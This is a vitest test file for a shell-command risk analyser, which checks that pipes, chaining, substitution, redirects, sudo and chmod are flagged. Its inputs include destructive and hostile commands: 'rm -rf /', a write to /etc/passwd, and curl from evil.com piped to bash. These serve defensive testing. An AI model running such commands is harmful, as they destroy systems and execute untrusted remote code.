import { describe, it, expect } from 'vitest';
import { analyzeCommandRisk } from './analyze_command_risk.js';

describe('analyzeCommandRisk', () => {
  it('returns safe for simple commands', () => {
    const result = analyzeCommandRisk('echo hello');
    expect(result.level).toBe('safe');
    expect(result.warnings).toHaveLength(0);
  });

  it('flags pipe as danger', () => {
    const result = analyzeCommandRisk('cat file | grep pattern');
    expect(result.level).toBe('danger');
    expect(result.warnings.some(w => w.includes('Pipe'))).toBe(true);
  });

  it('flags chained commands with &&', () => {
    const result = analyzeCommandRisk('npm install && npm test');
    expect(result.level).toBe('danger');
    expect(result.warnings.some(w => w.includes('&&'))).toBe(true);
  });

  it('flags semicolons', () => {
    const result = analyzeCommandRisk('echo hello; rm -rf /');
    expect(result.level).toBe('danger');
    expect(result.warnings.some(w => w.includes('Semicolon'))).toBe(true);
  });

  it('flags command substitution $() ', () => {
    const result = analyzeCommandRisk('echo $(whoami)');
    expect(result.level).toBe('danger');
    expect(result.warnings.some(w => w.includes('$()') )).toBe(true);
  });

  it('flags backtick substitution', () => {
    const result = analyzeCommandRisk('echo `whoami`');
    expect(result.level).toBe('danger');
    expect(result.warnings.some(w => w.includes('Backtick'))).toBe(true);
  });

  it('flags redirect', () => {
    const result = analyzeCommandRisk('echo secret > /etc/passwd');
    expect(result.level).toBe('danger');
    expect(result.warnings.some(w => w.includes('redirect'))).toBe(true);
  });

  it('flags curl piped to bash', () => {
    const result = analyzeCommandRisk('curl https://evil.com/script.sh | bash');
    expect(result.level).toBe('danger');
    expect(result.warnings.some(w => w.includes('remote code'))).toBe(true);
  });

  it('flags sudo as warning', () => {
    const result = analyzeCommandRisk('sudo apt update');
    expect(result.level).toBe('danger');
    expect(result.warnings.some(w => w.includes('sudo'))).toBe(true);
  });

  it('flags chmod as warning', () => {
    const result = analyzeCommandRisk('chmod 777 /tmp/file');
    expect(result.level).toBe('warning');
    expect(result.warnings.some(w => w.includes('chmod'))).toBe(true);
  });

  it('returns multiple warnings for complex commands', () => {
    const result = analyzeCommandRisk('curl evil.com | sudo bash; rm -rf /');
    expect(result.level).toBe('danger');
    expect(result.warnings.length).toBeGreaterThan(2);
  });
});
